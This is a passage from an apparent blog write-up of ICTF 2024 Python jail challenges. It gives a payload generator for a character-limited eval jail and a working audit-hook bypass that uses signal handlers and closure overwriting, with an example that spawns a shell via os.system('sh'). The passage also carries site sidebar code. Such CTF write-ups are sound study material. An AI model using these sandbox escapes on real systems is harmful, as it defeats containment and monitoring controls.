<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="1.804ex" height="1.791ex" role="img" focusable="false" viewBox="0 -626 797.6 791.6" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z" style="stroke-width: 3;"></path></g><g data-mml-node="mn" transform="translate(394,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>t</mi><mn>3</mn></msub></math></mjx-assistive-mml></mjx-container></td>
</tr>
<tr>
<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="7.31ex" height="2.026ex" role="img" focusable="false" viewBox="0 -873.3 3231 895.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z" style="stroke-width: 3;"></path></g><g data-mml-node="msup" transform="translate(1794.4,0)"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" style="stroke-width: 3;"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(500,0)" style="stroke-width: 3;"></path></g><g data-mml-node="mn" transform="translate(1033,403.1) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi><mo>×</mo><msup><mn>67</mn><mn>3</mn></msup></math></mjx-assistive-mml></mjx-container></td>
<td>...</td>
<td><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="1.964ex" height="1.773ex" role="img" focusable="false" viewBox="0 -626 868.3 783.8" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z" style="stroke-width: 3;"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"></path></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>t</mi><mi>n</mi></msub></math></mjx-assistive-mml></mjx-container></td>
</tr>
</tbody>
</table></div>
<p>We can reverse the length of the flag and just do an simple cross product to find each flag's value, have fun 😈<br>
<br></p>
<h4 id="try-3-throw-at-specific-value-with-a-nice-compare" tabindex="-1">Try 3 : Throw at specific value with a nice compare</h4>
<p>We can't use <code>=</code> but we can still make compares !</p>
<pre><code class="language-python">if(ord(flag[&lt;number&gt;])^&lt;number&gt;):raise # No raise :(
if(ord(flag[&lt;number&gt;])^&lt;number&gt;):a     # No if in eval
[a for i in flag if (ord(flag[&lt;number&gt;])^&lt;number&gt;)] # No spaces
[(a)for(i)in(flag)if(ord(flag[&lt;number&gt;])^&lt;number&gt;)] # Yeah !
</code></pre>
<p>Looks really good ! ...<br>
... but we are using too many different characters 😥</p>
<pre><code class="language-python"># Example
[(a)for(i)in(flag)if(ord(flag[True])^(True+True+...64 more...+True))] # flag[1]==67
</code></pre>
<p>Our idea is to have <code>flag[n]^x==0</code>, because Python takes anything not null, empty or zero as True we can use another operation to have a 0. An operator like <code>-</code> !</p>
<pre><code class="language-python">[(a)for(i)in(flag)if(ord(flag[&lt;number&gt;])-&lt;number&gt;)]

# Example
[(a)for(i)in(flag)if(ord(flag[-True])-(-True-True-...64 more...-True))] # flag[-1]==67
</code></pre>
<p>Works like a charm 🎇🤩✨ We can read the flag backward and check every value for any of the flag's characters !</p>
<p>Here too let's make a payload generator</p>
<pre><code class="language-python">def gen_payload2(rev_pos,chr):
    return &quot;[(a)for(u)in(flag)if(-ord(flag[&quot;+&quot;-True&quot;*rev_pos+&quot;])-(&quot;+&quot;-True&quot;*chr+&quot;))]&quot;
</code></pre>
<p><br><br></p>
<hr>
<p><br><br></p>
<h2 id="em-strong-calc-strong-em-auditing-audithook" tabindex="-1"><em><strong>Calc</strong></em> | Auditing Audithook</h2>
<h3 id="the-challenge-1" tabindex="-1">The challenge</h3>
<pre><code class="language-python">from sys import addaudithook
from os import _exit
from re import match


def safe_eval(exit, code):
    def hook(*a):
        exit(0)

    def dummy():
        pass

    dummy.__code__ = compile(code, &quot;&lt;code&gt;&quot;, &quot;eval&quot;)
    addaudithook(hook)
    return dummy()


if __name__ == &quot;__main__&quot;:
    expr = input(&quot;Math expression: &quot;)
    if len(expr) &lt;= 200 and match(r&quot;[0-9+\-*/]+&quot;, expr):
        print(safe_eval(_exit, expr))
    else:
        print(&quot;Do you know what is a calculator?&quot;)
</code></pre>
<p>Oooohh 😯 This one is an audithook bypass wrapped in a calculator themed jail.<br>
For simplicity let's simplify it for now. We will comeback to the original version in the end</p>
<pre><code class="language-python">from sys import addaudithook
from os import _exit

def safe_eval(exit, code):
    def hook(*a):
	    print(a) # for debugging
        exit(0)

    def dummy():
        pass

    dummy.__code__ = compile(code, &quot;&lt;code&gt;&quot;, &quot;eval&quot;)
    addaudithook(hook)
    return dummy()

expr = input(&quot;Math expression: &quot;)
print(safe_eval(_exit, expr))
</code></pre>
<p>The calculator thingy can be bypassed easily by just using a number at the start of our payload. We will see later, don't worry<br>
<br></p>
<h3 id="solving-process-1" tabindex="-1">Solving process</h3>
<p>It's not a first time audit hooks appear in CTFs. Tho there is a critical difference here. Let's simplify the jail further to compare it to <strong>MyJail</strong> from <em>NBCTF2023</em> (archived challenge can be found <a href="https://github.com/salvatore-abello/pyjail/blob/main/NBCTF%202023/MyJail.py" target="_blank" class="external-link">here</a>) :</p>
<pre><code class="language-python">from sys import addaudithook

def hook(*a): exit(0)
def dummy() : pass

expr = input(&quot;Math expression: &quot;)
dummy.__code__ = compile(expr, &quot;&lt;code&gt;&quot;, &quot;eval&quot;)

addaudithook(hook)

print(dummy())
</code></pre>
<p>If we try to bypass this jail it's pretty easy. We can't circumvent the audit rules but <strong>we can modify the sentence</strong> 😈🔨👩‍⚖️ We just have to modify the <code>hook</code> function</p>
<pre><code class="language-python">(exit:=lambda x:x), &lt;full control&gt;

# Examples
(exit:=lambda x:x),print(&quot;hacked &gt;:)&quot;)
(exit:=lambda x:x),exec(&quot;import os;os.system('sh')&quot;)
</code></pre>
<p>Easy to do right ? But here is the challenge introduced by the challmaker. <em>We can't access the local variable <code>exit</code> and modify it !</em></p>
<pre><code class="language-python">def safe_eval(exit, code): # we are here at runtime and can do everything ...
    def hook(*a):
        exit(0)            # ... but here exit is added to hook at compile time
                           # so we can't modify it from the outside
    def dummy():
        pass
</code></pre>
<p>What can we do ?</p>
<ul>
<li>explore audithook's internals and &quot;modify&quot; <code>hook</code> ?</li>
<li>explore Python's memory and &quot;modify&quot; <code>hook</code> ?</li>
<li>access <code>hook</code> from &quot;inside&quot; instead of outside 👀<br>
<br></li>
</ul>
<h3 id="bypassing-code-hook-code-from-the-inside" tabindex="-1">Bypassing <code>hook</code> from the inside</h3>
<p>Audithooks trigger at <a href="https://docs.python.org/3/library/audit_events.html#audit-events" target="_blank" class="external-link">certain events</a>. If we look at the <code>import</code> event it says</p>
<blockquote>
<p><code>module</code>, <code>filename</code>, <code>sys.path</code>, <code>sys.meta_path</code>, <code>sys.path_hooks</code></p>
</blockquote>
<p>meaning it triggers when we open a file that is going to be used as a library... But what if <strong>it is already loaded !</strong> Like in our jail with <code>from sys import addaudithook</code> and <code>from os import _exit</code> !</p>
<pre><code class="language-python">Math expression: __import__('sys')

# Output
&lt;module 'sys' (built-in)&gt;
</code></pre>
<pre><code class="language-python">Math expression: __import__('sys').modules.keys()

# Output
dict_keys(['sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', 'winreg', '_io', 'marshal', 'nt', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', 'encodings.cp1252', '_signal', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', '_winapi', 'ntpath', 'os.path', 'os', '_sitebuiltins', '_distutils_hack', 'site'])
</code></pre>
<p>Wow 🤩 That's a lot of modules to work with ! Most are out of audithooks' events too 😈<br>
If we ignore the Windows modules (no I won't apology for that) we can search in each frozen modules for gold.<br>
I will spoil it, <code>_signal</code> is where gold is hidden. There is some good stuff in <code>_frozen_importlib</code> and <code>_imp</code> too but when they go to read a file they execute <code>os.listdir</code>, raising an event 😭 You can also tinker with <em>debug traces</em>, <code>_thread</code> and other <em>builtin modules</em> (loadable with <code>_frozen_importlib</code>) but in my testing I didn't achieve anything substantial (<em>skill issue</em> 🙄)<br>
<br></p>
<h3 id="signaling-we-escaped" tabindex="-1">Signaling we escaped 😎</h3>
<p>Audithooks block <code>sys._current_frames</code>, <code>sys._getframe</code> and <code>sys._getframemodulename</code> to protect the code from being tampered with. We can't call this functions but what if the <code>frame</code> object came to us directly 😇 ?<br>
For that we are going to use <a href="https://docs.python.org/3/library/signal.html" target="_blank" class="external-link">signals</a>.  We can create a signal using <code>signal.signal(signalnum, handler)</code> (<a href="https://docs.python.org/3/library/signal.html#signal.signal" target="_blank" class="external-link">ref</a>)</p>
<blockquote>
<p><em>signalnum</em> : the signal number 🆗</p>
<p>The <em>handler</em> is called with two arguments: the <strong>signal number</strong> and the <strong>current stack frame</strong> 🤑</p>
</blockquote>
<pre><code class="language-python">signal.signal(2, lambda n,f:print(f))
</code></pre>
<p>To launch our trojan signal we just need to raise it using <code>raise_signal(signalnum)</code></p>
<pre><code class="language-python">(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f)),s.raise_signal(2)

# Output
&lt;frame at 0x000001F3EA9A8E00, file '&lt;code&gt;', line 1, code &lt;module&gt;&gt;
(&lt;module '_signal' (built-in)&gt;, &lt;built-in function default_int_handler&gt;, None)

# dir(f)
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', 
'__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'f_back', 'f_builtins', 'f_code', 'f_globals', 'f_lasti', 'f_lineno', 'f_locals', 'f_trace', 'f_trace_lines', 'f_trace_opcodes']

# f_locals
{'__name__': '__main__', '__doc__': 'from sys import addaudithook\n\ndef hook(*a): exit(0)\ndef dummy() : pass\n\nexpr = input(&quot;Math expression: &quot;)\ndummy.__code__ = compile(expr, &quot;&lt;code&gt;&quot;, &quot;eval&quot;)\n\naddaudithook(hook)\n\nprint(dummy())', '__package__': None, '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x00000162B1E85210&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, '__file__': 'c:path\\to\\wu.py', '__cached__': None, 'addaudithook': &lt;built-in function addaudithook&gt;, '_exit': &lt;built-in function _exit&gt;, 'safe_eval': &lt;function safe_eval at 0x00000162B1E304A0&gt;, 'expr': &quot;s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f.f_locals)),s.raise_signal(2)&quot;, 's': &lt;module '_signal' (built-in)&gt;}
</code></pre>
<p>Well not the right frame, let's move up and down with <code>f_back</code> (leaving the <code>dummy()</code> frame and going to <code>safe_eval</code>)</p>
<pre><code class="language-python">(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f.f_back)),s.raise_signal(2)

# Output
&lt;frame at 0x000001A3949DAF60, file 'c:path\\to\\wu.py', line 27, code safe_eval&gt;

# f_locals
{'exit': &lt;built-in function _exit&gt;, 'code': &quot;(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:print(f.f_back.f_locals)),s.raise_signal(2)&quot;, 'hook': &lt;function safe_eval.&lt;locals&gt;.hook at 0x000001ABF4218D60&gt;, 'dummy': &lt;function safe_eval.&lt;locals&gt;.dummy at 0x000001ABF4218EA0&gt;}
</code></pre>
<p>Finally 🤩 ! We have access to <code>hook</code> 🥳🎉<br>
To finish we just need to modify its local values through its <code>__closure__</code> (<a href="https://docs.python.org/3/reference/datamodel.html#function.__closure__" target="_blank" class="external-link">ref</a>)</p>
<pre><code class="language-python">lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr))
</code></pre>
<p>🥁 <em><strong>Final solution</strong></em> 🥁</p>
<pre><code class="language-python">(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr)),s.raise_signal(2),open('flag').read()

# And to avoid the limits in the Original version™️
0,(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr)),s.raise_signal(2),open('flag').read()


# Output
(0, &lt;module '_signal' (built-in)&gt;, &lt;built-in function default_int_handler&gt;, None, 'well_done')
</code></pre>
<p><br><br></p>
<h2 id="closing-note" tabindex="-1">Closing note</h2>
<p>Overall pretty interesting PyJails 💖 They were well guided with their really distinct little details, the left over <code>ord</code> in Ok Nice and all the function setup in Calc.<br>
As always we learned a lot about Python internals and what a madness it is in there 😋 Ok Nice was based more on our Python skills and creativity to get the flag, while Calc was more on Python internals (sys, _signal, frames, closure, ...)<br>
For <strong>Calc</strong>, one inspiration to find a bypass would be by looking at what was previously made. Audithooks are pwned since Python 3.8 and there are some places where it is <s>randomly</s> discussed, for instance <a href="https://github.com/python/cpython/issues/87604" target="_blank" class="external-link">on Github</a></p>
<p>If you want to read and discover more about <strong>Audithooks-based PyJails</strong>, I recommend reading :</p>
<ul>
<li><a href="https://xz.aliyun.com/t/12647" target="_blank" class="external-link">CTF Pyjail 沙箱逃逸绕过合集</a></li>
<li><a href="https://peps.python.org/pep-0578/" target="_blank" class="external-link">PEP 578 – Python Runtime Audit Hooks</a></li>
<li><a href="https://wachter-space.de/2023/11/12/csaw23-python-jail-escape/" target="_blank" class="external-link">Python Jail Escape CSAW Finals 2023</a></li>
</ul>
<p><br><br><br></p>
<p>​		<em><strong>See you next time! (˵ ͡~ ͜ʖ ͡°˵)ﾉ⌒♡*:･。.</strong></em></p>
<p style="font-family:'Courier New',monospace;margin-left:70%">hey<br>ily<br>shy</p>

      
      
    </main>

    
      <aside>
      <div class="sidebar">
            <div class="sidebar-container">
                  
                  
                        <script>
    async function fetchGraphData() {
        const graphData = await fetch('/graph.json').then(res => res.json());
        const fullGraphData  = filterFullGraphData(graphData);
        return {graphData, fullGraphData}
    }

    function getNextLevelNeighbours(existing, remaining) {
        const keys = Object.values(existing).map((n) => n.neighbors).flat();
        const n_remaining = Object.keys(remaining).reduce((acc, key) => {
                if (keys.indexOf(key) != -1) {
                    if (!remaining[key].hide) {
                        existing[key] = remaining[key];
                    }
                } else {
                    acc[key] = remaining[key];
                }
                return acc;
            }, {});
        return existing, n_remaining;
    }

    function filterLocalGraphData(graphData, depth) {
        if (graphData == null) {
            return null;
        }
        let remaining = JSON.parse(JSON.stringify(graphData.nodes));
        let links = JSON.parse(JSON.stringify(graphData.links));
        let currentLink = decodeURI(window.location.pathname);
        let currentNode = remaining[currentLink] || Object.values(remaining).find((v) => v.home);
        for (var key in remaining) {
            if (key.toLowerCase()==currentLink) {
                currentNode = remaining[key];
            }
        }
        delete remaining[currentNode.url];
        if (!currentNode.home) {
            let home = Object.values(remaining).find((v) => v.home);
            delete remaining[home.url];
        }
        currentNode.current = true;
        let existing = {};
        existing[currentNode.url] = currentNode;
        for (let i = 0; i < depth; i++) {
            existing, remaining = getNextLevelNeighbours(existing, remaining);
        }
        nodes = Object.values(existing);
        if (!currentNode.home) {
            nodes = nodes.filter(n => !n.home);
        }
        let ids = nodes.map((n) => n.id);
        return {
            nodes,
            links: links.filter(function (con) {
                return ids.indexOf(con.target) > -1 && ids.indexOf(con.source) > -1;
            }),
        }
    }

    function getCssVar(variable) {return getComputedStyle(document.body).getPropertyValue(variable)}

    function htmlDecode(input) {
        var doc = new DOMParser().parseFromString(input, "text/html");
        return doc.documentElement.textContent;
    }

    function renderGraph(graphData, id, delay, fullScreen) {
        if (graphData == null) {
            return;
        }
        const el = document.getElementById(id);
        width = el.offsetWidth;
        height = el.offsetHeight;
        const highlightNodes = new Set();
        let hoverNode = null;
        const color = getCssVar("--graph-main");
        const mutedColor = getCssVar("--graph-muted");
        let Graph = ForceGraph()
        (el)
            .graphData(graphData)
            .nodeId('id')
            .nodeLabel('title')
            .linkSource('source')
            .linkTarget('target')
            .d3AlphaDecay(0.10)
            .width(width)
            .height(height)
            .linkDirectionalArrowLength(2)
            .linkDirectionalArrowRelPos(0.5)
            .autoPauseRedraw(false)
            .linkColor((link) => {
                if (hoverNode == null) {
                    return color;
                }
                if (link.source.id == hoverNode.id || link.target.id == hoverNode.id) {
                    return color;
                } else {
                    return mutedColor;
                }
                
            })
            .nodeCanvasObject((node, ctx) => {
                const numberOfNeighbours = (node.neighbors && node.neighbors.length) || 2;
                const nodeR = Math.min(7, Math.max(numberOfNeighbours / 2, 2));
                
                ctx.beginPath();
                ctx.arc(node.x, node.y, nodeR, 0, 2 * Math.PI, false);
                if (hoverNode == null) {
                    ctx.fillStyle = color;
                } else {
                    if (node == hoverNode || highlightNodes.has(node.url)) {
                        ctx.fillStyle = color;
                    } else {
                        ctx.fillStyle = mutedColor;
                    }
                }
                 
                ctx.fill();
                
                if (node.current) {
                    ctx.beginPath();
                    ctx.arc(node.x, node.y, nodeR + 1, 0, 2 * Math.PI, false);
                    ctx.lineWidth = 0.5;
                    ctx.strokeStyle = color;
                    ctx.stroke();
                }

                const label = htmlDecode(node.title)
                const fontSize = 3.5;
                ctx.font = `${fontSize}px Sans-Serif`;

                ctx.textAlign = 'center';
                ctx.textBaseline = 'top';
                ctx.fillText(label, node.x, node.y + nodeR + 2);
            })
            .onNodeClick(node => {
                window.location = node.url;
            })
            .onNodeHover(node => {
                highlightNodes.clear();
                if (node) {
                highlightNodes.add(node);
                node.neighbors.forEach(neighbor => highlightNodes.add(neighbor));
                }
                hoverNode = node || null;
                
            });
            if (fullScreen || (delay != null && graphData.nodes.length > 4)) {
                setTimeout(() => {
                    Graph.zoomToFit(5, 75);
                }, delay || 200);
            }
        return Graph;
    }

    function renderLocalGraph(graphData, depth, fullScreen) {
        if (window.graph){
            window.graph._destructor();
        }
        const data = filterLocalGraphData(graphData, depth);
        return renderGraph(data, 'link-graph', null, fullScreen);
    }

    function filterFullGraphData(graphData) {
        if (graphData == null) {
            return null;
        }
        graphData = JSON.parse(JSON.stringify(graphData));
        const hiddens = Object.values(graphData.nodes).filter((n) => n.hide).map((n) => n.id);
        const data = {
            links: JSON.parse(JSON.stringify(graphData.links)).filter((l) => hiddens.indexOf(l.source) == -1 && hiddens.indexOf(l.target) == -1),
            nodes: [...Object.values(graphData.nodes).filter((n) => !n.hide)]
        }
        return data
    }

    function openFullGraph(fullGraphData) {
        lucide.createIcons({
                attrs: {
                    class: ["svg-icon"]
                }
            });
        return renderGraph(fullGraphData, "full-graph-container", 200, false);;
    }

    function closefullGraph(fullGraph) {
        if (fullGraph) {
            fullGraph._destructor();
        }
        return null;
    }
</script>
<div  x-init="{graphData, fullGraphData} = await fetchGraphData();" x-data="{ graphData: null, depth: 1, graph: null, fullGraph: null, showFullGraph: false, fullScreen: false, fullGraphData: null}" id="graph-component" x-bind:class="fullScreen ? 'graph graph-fs' : 'graph'" v-scope>
    <div class="graph-title-container">
        <div class="graph-title">Connected Pages</div>
        <div id="graph-controls">
                <div class="depth-control">
                    <label for="graph-depth">Depth</label>
                    <div class="slider">
                            <input x-model.number="depth" name="graph-depth" list="depthmarkers" type="range" step="1" min="1" max="3" id="graph-depth">
                    <datalist id="depthmarkers">
                            <option value="1" label="1"></option>
                            <option value="2" label="2"></option>
                            <option value="3" label="3"></option>
                    </datalist>
                    </div>
                    <span id="depth-display" x-text="depth"></span>
                </div>
                <div class="ctrl-right">
                    <span id="global-graph-btn" x-on:click="showFullGraph = true; setTimeout(() => {fullGraph = openFullGraph(fullGraphData)}, 100)"><i  icon-name="globe" aria-hidden="true"></i></span>
                    <span  id="graph-fs-btn"  x-on:click="fullScreen = !fullScreen"><i  icon-name="expand" aria-hidden="true"></i></span>
                </div>
        </div>
    </div>
    <div x-effect="window.graph = renderLocalGraph(graphData, depth, fullScreen)" id="link-graph" ></div>
    <div x-show="showFullGraph" id="full-graph" class="show" style="display: none;">
        <span id="full-graph-close" x-on:click="fullGraph = closefullGraph(fullGraph); showFullGraph = false;"><i icon-name="x" aria-hidden="true"></i></span><div id="full-graph-container"></div>
    </div>
</div>

                  

                  
                        
                        
                              <div class="toc">
                                    <div class="toc-title-container">
                                          <div class="toc-title">
                                                On this page
                                          </div>
                                    </div>
                                    <div class="toc-container">
                                          <nav class="toc">
                <ol>
                    
                    <li><a href="#ictf-2024-em-all-py-jails-em-any">ICTF 2024 - All PyJails 『ANY %』</a>
            
                <ol>
                    
                    <li><a href="#em-strong-ok-nice-strong-em-strong-ord-strong-inary-challenge">Ok nice | Ordinary challenge</a>
            
                <ol>
                    
                    <li><a href="#the-challenge">The challenge</a>
            		</li>

                    <li><a href="#solving-process">Solving process</a>
            
                <ol>
                    
                    <li><a href="#making-numbers">Making numbers</a>
            		</li>

                    <li><a href="#try-1-low-hanging-fruits">Try 1 : low hanging fruits</a>
            		</li>

                    <li><a href="#try-2-timing-attack-with-homemade-range-and-and-quot-for-loop-and-quot">Try 2 : timing attack with homemade range and "for loop"</a>
            		</li>

                    <li><a href="#try-3-throw-at-specific-value-with-a-nice-compare">Try 3 : Throw at specific value with a nice compare</a>
            		</li>
                </ol>
            		</li>
                </ol>
            		</li>

                    <li><a href="#em-strong-calc-strong-em-auditing-audithook">Calc | Auditing Audithook</a>
            
                <ol>
                    
                    <li><a href="#the-challenge-1">The challenge</a>
            		</li>

                    <li><a href="#solving-process-1">Solving process</a>
            		</li>

                    <li><a href="#bypassing-code-hook-code-from-the-inside">Bypassing hook from the inside</a>
            		</li>

                    <li><a href="#signaling-we-escaped">Signaling we escaped 😎</a>
            		</li>
                </ol>
            		</li>

                    <li><a href="#closing-note">Closing note</a>
            		</li>
                </ol>
            		</li>
                </ol>
            </nav>
                                    </div>
                              </div>
                        

                  

                        
                              
                              <div class="backlinks">
                                    <div class="backlink-title" style="margin: 4px 0 !important;">Pages mentioning this page</div>
                                          <div class="backlink-list"><div class="backlink-card"><i  icon-name="link"></i><a href="/👩‍🏫Writeups/ALL WRITEUPS/" data-note-icon="" class="backlink">ALL WRITEUPS</a>
                                                </div></div>
                              </div>
                        
                  
                  
            </div>
      </div>
</aside>
    

    
      
<style>
#tooltip-wrapper {
  background: var(--background-primary);
  padding: 1em;
  border-radius: 4px;
  overflow: hidden;
  position: fixed;
  width: 80%;
  max-width: 400px;
  height: auto;
  max-height: 300px;
  font-size: 0.8em;
  box-shadow: 0 5px 10px rgba(0,0,0,0.1);
  opacity: 0;
